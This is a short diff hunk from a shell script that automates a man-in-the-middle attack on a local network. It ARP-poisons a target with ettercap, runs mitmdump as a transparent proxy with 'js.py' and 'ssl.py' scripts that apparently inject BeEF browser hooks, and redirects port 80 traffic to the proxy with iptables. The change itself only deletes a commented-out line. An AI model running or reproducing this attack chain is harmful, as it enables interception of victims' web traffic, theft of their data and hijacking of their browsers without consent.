@@ -74,8 +74,6 @@ echo ""
 sleep 2
 xterm -T "ETTERCAP ATTACKING $target" -e "ettercap -Tq -M arp:remote -i $intr -S /$ip// /$target//" &
 sleep 2
-#xterm -T "SSL PROXIES" -e "mitmdump -s ssl.py -m transparent" &
-sleep 2
 xterm -T "PROXY SERVER = = ATTACKING WITH BEEF-HOOKS" -e "mitmdump -s "js.py" -s "ssl.py" -m transparent -p 8080" &
 sleep 2
 xterm -e "iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 8080" &
